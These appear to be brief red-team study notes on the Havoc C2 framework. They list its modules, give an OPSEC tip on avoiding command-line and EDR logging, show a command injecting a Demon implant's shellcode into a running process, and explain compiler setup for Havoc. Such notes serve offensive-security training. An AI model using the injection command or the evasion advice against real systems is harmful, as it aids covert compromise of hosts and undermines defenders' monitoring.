# Additional Havoc
# Havoc Modules
***dotnet***
    inline-execute
    execute

***Inline - execute (BOF Loader!!!)***


>OPSEC Hint : When running the shell command, the process hosting your beacon/implant will spawn a child process, run the command and exit the child process. This is quite noisy compared to running everything in memory in the same process. Also command-line logging (eventlogs, sysmon and EDR's will log the commands.)

***shell***

***shellcode*** 
```code
shellcode inject x64 6556 /opt/havoc/payloads/demon.x64.bin
```

> Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)
>
> HAVOC Requires `sudo apt install mingw-w64 -y` on your kali !!! In case of compile errors, download this : https://github.com/troglobit/misc/releases/download/11-20211120/x86_64-w64-mingw32-cross.tgz extract to /usr/bin (#~$ sudo tar -xzvf [compilerZip].tgz -C /usr/bin)
>
> Then modify your /usr/share/havoc/profiles/havoc.yaotl file and change both the
> Compiler64 & Compiler86 variables to point to: "usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"

```yaml
Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
```